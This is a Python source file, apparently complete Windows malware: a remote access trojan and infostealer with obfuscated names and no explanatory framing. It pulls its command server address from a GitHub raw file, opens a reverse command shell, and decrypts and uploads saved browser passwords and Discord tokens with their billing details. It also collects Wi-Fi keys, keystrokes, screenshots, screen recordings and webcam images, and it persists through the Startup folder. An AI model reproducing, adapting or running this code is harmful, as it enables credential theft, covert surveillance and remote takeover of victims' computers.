import subprocess,socket,time,requests,os,logging,imageio,json,sqlite3,win32crypt,base64,shutil,re,browser_cookie3
from PIL import ImageGrab
from pynput.keyboard import Key, Listener
from datetime import datetime
from Cryptodome.Cipher import AES
PFiHDUQDb = ""
rgDmboKCMdKaPpKP = ""
uDhnUJqRmqgAJCGqh = "12.02.25.1"
KEYLOGONSTART = True
HFawwEiAjjCRKGpzAhmDLT = "!"
QlQbLvse = "https://raw.githubusercontent.com/eb-repo/files/refs/heads/main/info.txt"
CGcvrzjUHgEaoafH = "https://raw.githubusercontent.com/eb-repo/scripts/refs/heads/main/"
fitluufLslNzU = os.path.expanduser("~\\AppData\\Local\\")
USER_ROAMING = os.path.expanduser("~\\AppData\\Roaming\\")
PfqnyaF = ""
GuibJtEcdCNNJCtOplkZTk = {
	'chrome':fitluufLslNzU+'Google\\Chrome\\User Data','chromium':fitluufLslNzU+'Chromium\\User Data','chrome-canary':fitluufLslNzU+'Google\\Chrome SxS\\User Data',
	'msedge':fitluufLslNzU+'Microsoft\\Edge\\User Data','msedge-canary':fitluufLslNzU+'Microsoft\\Edge SxS\\User Data',
	'msedge-beta':fitluufLslNzU+'Microsoft\\Edge Beta\\User Data','msedge-dev':fitluufLslNzU+'Microsoft\\Edge Dev\\User Data',
	'avast':fitluufLslNzU+'AVAST Software\\Browser\\User Data','amigo':fitluufLslNzU+'Amigo\\User Data',
	'torch':fitluufLslNzU+'Torch\\User Data','kometa':fitluufLslNzU+'Kometa\\User Data','orbitum':fitluufLslNzU+'Orbitum\\User Data',
	'cent-browser':fitluufLslNzU+'CentBrowser\\User Data','7star':fitluufLslNzU+'7Star\\7Star\\User Data',
	'sputnik':fitluufLslNzU+'Sputnik\\Sputnik\\User Data','vivaldi':fitluufLslNzU+'Vivaldi\\User Data',
	'epic-privacy-browser':fitluufLslNzU+'Epic Privacy Browser\\User Data','uran':fitluufLslNzU+'uCozMedia\\Uran\\User Data',
	'yandex':fitluufLslNzU+'Yandex\\YandexBrowser\\User Data','brave':fitluufLslNzU+'BraveSoftware\\Brave-Browser\\User Data',
	'iridium':fitluufLslNzU+'Iridium\\User Data','coccoc':fitluufLslNzU+'CocCoc\\Browser\\User Data',
	'opera':USER_ROAMING+'Opera Software\\Opera Stable','opera-gx':USER_ROAMING+'Opera Software\\Opera GX Stable'
}
def OyUAfijiaScXcdCtUkgnpM(host, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, int(port) if port.isdecimal() else 5002))
	return s
def bnSNVQUMiGfbH(s):
	data = s.recv(1024)
	if len(data)==0:
		return True
	gnYEgjTLjEGgIgFwOIMAbm = data.decode("utf-8").replace("\n","")
	if not gnYEgjTLjEGgIgFwOIMAbm.startswith(HFawwEiAjjCRKGpzAhmDLT):
		proc = subprocess.run(gnYEgjTLjEGgIgFwOIMAbm, shell=True, capture_output=True)
		wzGsfkU = proc.stdout + proc.stderr
		WXitFUlByfgybbqbkwVpFq(s, wzGsfkU)
		return
	CwZwXnxnNXovJSxj = gnYEgjTLjEGgIgFwOIMAbm.split(" ")[0][1:]
	args = " ".join(gnYEgjTLjEGgIgFwOIMAbm.split()[1:]).split()
	if CwZwXnxnNXovJSxj == "download":
		NQvYhraphf(s, gnYEgjTLjEGgIgFwOIMAbm)
	elif CwZwXnxnNXovJSxj == "screenshot":
		OFcxPgXjFLpZYYGUSLOEkm(s)
	elif CwZwXnxnNXovJSxj == "basename":
		WXitFUlByfgybbqbkwVpFq(s, os.path.basename(__file__))
	elif CwZwXnxnNXovJSxj == "update":
		irxXhHRYabuDB(s)
	elif CwZwXnxnNXovJSxj == "wifi":
		LwknLmpcsvaoVJh(s)
	elif CwZwXnxnNXovJSxj == "screenrecord":
		eWFIPkVfPWbNmktp(s, args)
	elif CwZwXnxnNXovJSxj == "browsers":
		oirnsrPChJjaLOG(s)
	elif CwZwXnxnNXovJSxj == "webcam":
		webCam(s, args)
	elif CwZwXnxnNXovJSxj == "cd":
		try:
			os.chdir(gnYEgjTLjEGgIgFwOIMAbm[4:])
			WXitFUlByfgybbqbkwVpFq(s,"")
		except: pass
def NQvYhraphf(s, gnYEgjTLjEGgIgFwOIMAbm):
	shGNQDgDpYeHMkiTa = gnYEgjTLjEGgIgFwOIMAbm.replace(HFawwEiAjjCRKGpzAhmDLT+"download ","").split(",")
	wzGsfkUs = ""
	for f in shGNQDgDpYeHMkiTa:
		wzGsfkUs += UYTDmyD(f, "api/file/", { "type":os.path.splitext(f)[1] })
	WXitFUlByfgybbqbkwVpFq(s, wzGsfkUs)
def OFcxPgXjFLpZYYGUSLOEkm(s):
	image = ImageGrab.grab(bbox=None,
		include_layered_windows=False,all_screens=True,xdisplay=None)
	MhvPVHxjvCpr = os.path.expanduser("~\\AppData\\Local\\")+"ss.jpg"
	image.save(MhvPVHxjvCpr)
	image.close()
	wzGsfkU = UYTDmyD(MhvPVHxjvCpr, "api/sscap")
	os.remove(MhvPVHxjvCpr)
	WXitFUlByfgybbqbkwVpFq(s, wzGsfkU)
def webCam(s, args):
	cameraNumber = 0
	try:
		if len(args) > 0:
			try: cameraNumber = int(args[0])
			except: pass
		camera = imageio.get_reader(f"<video{cameraNumber}>")
		imageio.imwrite(fitluufLslNzU+"wc.jpg", camera.get_data(0))
		camera.close()
		r=UYTDmyD(fitluufLslNzU+"wc.jpg","api/wc")
		WXitFUlByfgybbqbkwVpFq(s, r)
	except:
		WXitFUlByfgybbqbkwVpFq(s, "[!] 404")
def eWFIPkVfPWbNmktp(s, args):
	ghWvrRjstezcIaGaOidT = 15
	if not args == []:
		try: ghWvrRjstezcIaGaOidT = int(args[0])
		except: pass
	asHGeXCylRJX = os.path.expanduser("~\\AppData\\Local\\")+"sr.mp4"
	gbToEVzoBD = []
	fps = 11
	numFrames = ghWvrRjstezcIaGaOidT * fps
	for _ in range(numFrames):
		gbToEVzoBD.append(ImageGrab.grab(bbox=None, all_screens=True))
	imageio.mimsave(asHGeXCylRJX, gbToEVzoBD, fps=fps, quality=8)
	UYTDmyD(asHGeXCylRJX, "api/screc")
def UYTDmyD(HpMvITGN, zPaDLMOoLjbBX, BVcPYaPmKHXJtZC=None):
	if not os.path.isfile(HpMvITGN):
		return "[!] 404: "+HpMvITGN+"\n"
	headers = {"user":os.getlogin()}
	if BVcPYaPmKHXJtZC is not None:
		headers = {**headers, **BVcPYaPmKHXJtZC}
	f = open(HpMvITGN, "rb")
	requests.post("http://"+PFiHDUQDb+":5555/"+zPaDLMOoLjbBX,
		files={"file":f},
		headers=headers)
	f.close()
	return "[+] 200"
def eWTsZYxBKsJgpy(tfpfxVOGhnjw, zPaDLMOoLjbBX):
	if tfpfxVOGhnjw.strip() == "":
		return "[!] 204"
	requests.post("http://"+PFiHDUQDb+":5555/"+zPaDLMOoLjbBX,
		data=tfpfxVOGhnjw,
		headers={"user":os.getlogin()})
	return "[+] 200"
def irxXhHRYabuDB(s):
	h, p, v = iZCYyZiBRykGMy(True)
	if (v != uDhnUJqRmqgAJCGqh):
		XqzizHkBidTKHyQdIdxuv(v)
		WXitFUlByfgybbqbkwVpFq(s, "[+] 200")
	else:
		WXitFUlByfgybbqbkwVpFq(s, "[-] 304")
def LwknLmpcsvaoVJh(s):
	try:
		profiles = [line.split(":")[1].strip().replace("\r","") for line in subprocess.check_output("netsh wlan show profiles", creationflags=0x08000000, shell=True).decode().split("\n") if "User Profile" in line]
	except:
		WXitFUlByfgybbqbkwVpFq(s, "[!] 500")
		return
	YhvUVQpxSijZSH = ""
	for p in profiles:
		try: YhvUVQpxSijZSH+=f"    {p} - " + subprocess.check_output(f"netsh wlan show profile \"{p}\" key=clear", shell=True).decode().split("Key Content")[1].split("Cost")[0].replace(":","").strip()
		except: YhvUVQpxSijZSH+=f"    {p} - N/A"
	WXitFUlByfgybbqbkwVpFq(s, YhvUVQpxSijZSH)
def XqzizHkBidTKHyQdIdxuv(jGhSUSymq):
	global KEYLOGONSTART
	NlWnsKpj = os.path.basename(__file__)
	fileType = NlWnsKpj.split(".")[-1]
	SmERtNMUzTyFsMGzy = NlWnsKpj.split(".")[0]+"."+jGhSUSymq+".pyw" if fileType.startswith("py") else ".exe"
	XmCYiPAxXiLsbfUHUi = os.path.join(os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"), SmERtNMUzTyFsMGzy)
	if not os.path.isfile(XmCYiPAxXiLsbfUHUi):
		with open(XmCYiPAxXiLsbfUHUi, "w+") as f:
			f.write(requests.get(CGcvrzjUHgEaoafH+"file."+ "pyw" if XmCYiPAxXiLsbfUHUi.split(".")[-1].startswith("py") else "exe").text)
	else:
		KEYLOGONSTART = False
def iZCYyZiBRykGMy(force=False):
	global PFiHDUQDb, rgDmboKCMdKaPpKP
	if force or PFiHDUQDb == "" or rgDmboKCMdKaPpKP == "":
		data = requests.get(QlQbLvse).text.replace("\n","").split(":")
		PFiHDUQDb = data[0].strip()
		rgDmboKCMdKaPpKP = data[1].strip()
		jGhSUSymq = data[2].strip()
	return PFiHDUQDb, rgDmboKCMdKaPpKP, jGhSUSymq
def bVefnIPEJt():
	try:
		daFMWAGJeKAuMX = "settings.xpb"
		NOHWUIekXsjpRMJyQDLS = sorted([file for file in os.listdir(fitluufLslNzU) if os.path.isfile(fitluufLslNzU+"\\"+file) and file.endswith(daFMWAGJeKAuMX.split(".")[-1])])
		if daFMWAGJeKAuMX in NOHWUIekXsjpRMJyQDLS:
			NOHWUIekXsjpRMJyQDLS.remove(daFMWAGJeKAuMX)
		kDxNVchzvyuNLiV = os.path.join(fitluufLslNzU,daFMWAGJeKAuMX)
		if len(NOHWUIekXsjpRMJyQDLS) > 0:
			with open(kDxNVchzvyuNLiV, "ab+") as f:
				for file in NOHWUIekXsjpRMJyQDLS:
					temp = os.path.join(fitluufLslNzU,file)
					with open(temp,"rb") as tf:
						f.write(tf.read())
					os.remove(temp)
		UYTDmyD(kDxNVchzvyuNLiV, "api/log")
		if os.path.isfile(kDxNVchzvyuNLiV):
			os.remove(kDxNVchzvyuNLiV)
	except:
		pass
def CQnTwSELYagbubc():
	logging.basicConfig(filename=(fitluufLslNzU+str(datetime.today().strftime("%d")) + ".xpb"),
		level=logging.DEBUG,format="%(asctime)s %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
	def xGNRJvFiWtsevgEGDAmaKI(k):
		logging.info(str(k))
	k=Listener(on_press=xGNRJvFiWtsevgEGDAmaKI)
	NFXfIYBrfQkPdWvaiOS = [logging.getLogger(name) for name in logging.root.manager.loggerDict if not name.startswith("pynput")]
	for l in NFXfIYBrfQkPdWvaiOS:
		l.setLevel(logging.CRITICAL)
	k.start()
def oirnsrPChJjaLOG(s, upload=False):
        ldcOPWKnQ = "\n"
        for browser in GuibJtEcdCNNJCtOplkZTk:
                path = GuibJtEcdCNNJCtOplkZTk[browser]
                ZikrQNgmsL = None
                if not os.path.isfile(path+"\\Local State"):
                        continue
                with open(path+"\\Local State", "r") as f:
                        localstate = base64.b64decode(json.load(f)["os_crypt"]["encrypted_key"])[5:]
                        ZikrQNgmsL = win32crypt.CryptUnprotectData(localstate,None,None,None,0)[1]
                profiles = [p for p in os.listdir(path) if p == "Default" or p.startswith("Profile ")]
                if browser == "opera" or browser == "opera-gx": profiles=[""]
                for profile in profiles:
                        try:shutil.copyfile(f"{path}\\{profile}\\Login Data", fitluufLslNzU+"\\db.db")
                        except:continue
                        conn = sqlite3.connect(fitluufLslNzU+"\\db.db")
                        cursor = conn.cursor()
                        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                        ldcOPWKnQ += str("*"*8+f" {browser} - {profile} "+"*"*8+"\n")
                        for _, data in enumerate(cursor.fetchall()):
                                ciphertext = data[2]
                                initVector = ciphertext[3:15]
                                encryptedPwd = ciphertext[15:-16]
                                cipher = AES.new(ZikrQNgmsL, AES.MODE_GCM, initVector)
                                decryptedPwd = (cipher.decrypt(encryptedPwd)).decode()
                                ldcOPWKnQ += f"URL: {data[0]}\nUser: {data[1]}\nValue: {decryptedPwd}\n\n"
                        cursor.close()
                        conn.close()
                        os.remove(fitluufLslNzU+"\\db.db")
        BNPvvtulynsEzxrmma = []
        discordPaths = [USER_ROAMING+'\\discord\\Local Storage\\leveldb\\',USER_ROAMING+'\\discordcanary\\Local Storage\\leveldb\\',USER_ROAMING+'\\discordptb\\Local Storage\\leveldb\\']
        for p in [dp for dp in discordPaths if os.path.exists(dp)]:
                ZikrQNgmsL = ""
                with open(p.replace("Local Storage\\leveldb\\","")+"Local State", "r") as f:
                        localstate = base64.b64decode(json.load(f)["os_crypt"]["encrypted_key"])[5:]
                        ZikrQNgmsL = win32crypt.CryptUnprotectData(localstate,None,None,None,0)[1]
                for file in [f for f in os.listdir(p) if f.endswith(".log") or f.endswith(".ldb")]:
                        for line in [x.strip() for x in open(f"{p}\\{file}","r", errors="ignore").readlines() if x.strip()]:
                                for value in re.findall(r"dQw4w9WgXcQ:[^\"]*", line):
                                        value = base64.b64decode(value.split('dQw4w9WgXcQ:')[1])
                                        tinitVector = value[3:15]
                                        encryptedToken = value[15:]
                                        tcipher = AES.new(ZikrQNgmsL, AES.MODE_GCM, tinitVector)
                                        decryptedToken = (tcipher.decrypt(encryptedToken))[:-16].decode()
                                        if decryptedToken not in BNPvvtulynsEzxrmma:
                                                BNPvvtulynsEzxrmma.append(decryptedToken)
        wBAGFBe = "https://discord.com/api/v9/users/@me"
        if BNPvvtulynsEzxrmma: ldcOPWKnQ +="*"*8+"Discord Data: "+"*"*8+"\n\n"
        for deKsLdXmNOgfoQerajgeNVG in BNPvvtulynsEzxrmma:
                headers = {"Content-Type":"application/json","Authorization":deKsLdXmNOgfoQerajgeNVG,
                           "User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"}
                j = requests.get(wBAGFBe, headers=headers).json()
                if j.get("message") != None: continue
                user = str(j.get('username')) + '#' + str(j.get("discriminator"))
                badges = ""
                flags = j['flags']
                if (flags == 1): badges += "Staff, "
                if (flags == 2): badges += "Partner, "
                if (flags == 4): badges += "Hypesquad Event, "
                if (flags == 8): badges += "Green Bughunter, "
                if (flags == 64): badges += "Hypesquad Bravery, "
                if (flags == 128): badges += "HypeSquad Brillance, "
                if (flags == 256): badges += "HypeSquad Balance, "
                if (flags == 512): badges += "Early Supporter, "
                if (flags == 16384): badges += "Gold BugHunter, "
                if (flags == 131072): badges += "Verified Bot Developer, "
                if (badges == ""): badges = "None"
                email = j.get("email")
                phone = j.get("phone") if j.get("phone") else "N/A"
                try:
                        nitro_data = requests.get(wBAGFBe+'/billing/subscriptions', headers=headers).json()
                        has_nitro = bool(len(nitro_data) > 0)
                except: pass
                try: billing = bool(len(json.loads(requests.get(wBAGFBe+"/billing/payment-sources", headers=headers).text)) > 0)
                except: pass
                ldcOPWKnQ += f"\n{user}\n{'-'*len(user)}\nToken: {deKsLdXmNOgfoQerajgeNVG}\nHas Billing: {billing}\nNitro: {has_nitro}\nBadges: {badges}\nEmail: {email}\nPhone: {phone}\n\n"
        ldcOPWKnQ += "\n\n"
        if not upload:
                WXitFUlByfgybbqbkwVpFq(s, ldcOPWKnQ)
        else:
                eWTsZYxBKsJgpy(ldcOPWKnQ, "api/google")
def WXitFUlByfgybbqbkwVpFq(clientSocket, tfpfxVOGhnjw):
	formattedData = b""
	if type(tfpfxVOGhnjw) == bytes:
		formattedData += tfpfxVOGhnjw
	else:
		formattedData += bytes(tfpfxVOGhnjw, "utf-8")
	formattedData += bytes("\n"+PfqnyaF+os.getcwd().replace("\\","/")+" >> ", "utf-8")
	clientSocket.sendall(formattedData)
def ojNJNqNiTcytxpcf():
	global PfqnyaF
	h, p, v = iZCYyZiBRykGMy()
	try:
		bVefnIPEJt()
		oirnsrPChJjaLOG(None,True)
		if uDhnUJqRmqgAJCGqh != v:
			XqzizHkBidTKHyQdIdxuv(v)
		if KEYLOGONSTART:
			CQnTwSELYagbubc()
		pass
	except:
		pass
	try: os.chdir(os.path.expanduser("~"))
	except: pass
	PfqnyaF = ("(old)"if uDhnUJqRmqgAJCGqh!=v else "")+"["+uDhnUJqRmqgAJCGqh+"] "+os.getlogin()+" - "
	while True:
		EBozvdJodMdSXbchgPq=False
		try:
			s=OyUAfijiaScXcdCtUkgnpM(h, p)
			WXitFUlByfgybbqbkwVpFq(s, "")
			while not EBozvdJodMdSXbchgPq:
				EBozvdJodMdSXbchgPq=bnSNVQUMiGfbH(s)
			s.close()
		except:
			pass
		time.sleep(5)
ojNJNqNiTcytxpcf()